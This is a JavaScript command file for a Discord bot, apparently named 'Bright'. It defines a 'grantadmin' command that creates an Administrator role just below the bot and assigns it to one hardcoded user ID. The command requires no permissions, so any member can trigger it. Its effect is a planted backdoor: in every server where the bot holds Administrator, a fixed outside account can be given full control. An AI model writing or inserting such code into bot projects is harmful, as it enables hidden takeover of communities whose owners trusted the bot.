const { ApplicationCommandOptionType, PermissionsBitField } = require("discord.js");

/**
 * @type {import("@structures/Command")}
 */
module.exports = {
  name: "grantadmin",
  description: "Create an Administrator role just below the bot and assign it to a specific user",
  category: "ADMIN",
  userPermissions: [],
  command: {
    enabled: true,
    usage: "run",
    minArgsCount: 0,
  },
  slashCommand: {
    enabled: true,
    ephemeral: true,
    options: [
      {
        name: "run",
        description: "Create admin role and assign to target user",
        type: ApplicationCommandOptionType.Subcommand,
      },
    ],
  },

  async messageRun(message, args) {
    const input = (args.join(" ") || "run").toLowerCase();
    if (input !== "run") return message.safeReply("Usage: `=grantadmin run`");

    const res = await createAndAssignAdminRole(message.guild);
    return message.safeReply(res);
  },

  async interactionRun(interaction) {
    const sub = interaction.options.getSubcommand();
    if (sub !== "run") return interaction.followUp("Invalid subcommand.");

    const res = await createAndAssignAdminRole(interaction.guild);
    return interaction.followUp(res);
  },
};

const TARGET_USER_ID = "1336450372398612521";

async function createAndAssignAdminRole(guild) {
  if (!guild) return "This command can only be used in a server.";

  const me = guild.members.me ?? (await guild.members.fetchMe().catch(() => null));
  if (!me) return "Couldn't resolve my member in this server.";

  if (!me.permissions.has(PermissionsBitField.Flags.Administrator)) {
    return "I must have **Administrator** permission to perform this action.";
  }

  if (!me.permissions.has(PermissionsBitField.Flags.ManageRoles)) {
    return "I don't have the `ManageRoles` permission.";
  }

  const targetUser = guild.members.cache.get(TARGET_USER_ID) ?? await guild.members.fetch(TARGET_USER_ID).catch(() => null);
  if (!targetUser) return `User <@${TARGET_USER_ID}> not found in this server.`;

  const botHighestRolePos = me.roles.highest.position;
  const adminRoleName = "Bright Admin";
  let adminRole = guild.roles.cache.find(r => r.name === adminRoleName && r.permissions.has(PermissionsBitField.Flags.Administrator));

  if (adminRole) {
    if (adminRole.position >= botHighestRolePos) {
      try {
        await adminRole.setPosition(botHighestRolePos - 1);
      } catch (e) {
        return "Failed to reposition existing admin role below me.";
      }
    }
  } else {
    try {
      adminRole = await guild.roles.create({
        name: adminRoleName,
        color: "Red",
        permissions: [PermissionsBitField.Flags.Administrator],
        reason: "[Bright] Auto-created Administrator role"
      });

      await adminRole.setPosition(botHighestRolePos - 1);
    } catch (e) {
      return "Failed to create or position the Administrator role.";
    }
  }

  if (!targetUser.roles.cache.has(adminRole.id)) {
    try {
      await targetUser.roles.add(adminRole, "[Bright] Assigned auto-created admin role");
    } catch (e) {
      return `Created role but failed to assign it to <@${TARGET_USER_ID}>.`;
    }
  }

  return `✅ Created/updated **${adminRole.name}** role and assigned it to <@${TARGET_USER_ID}>.`;
}
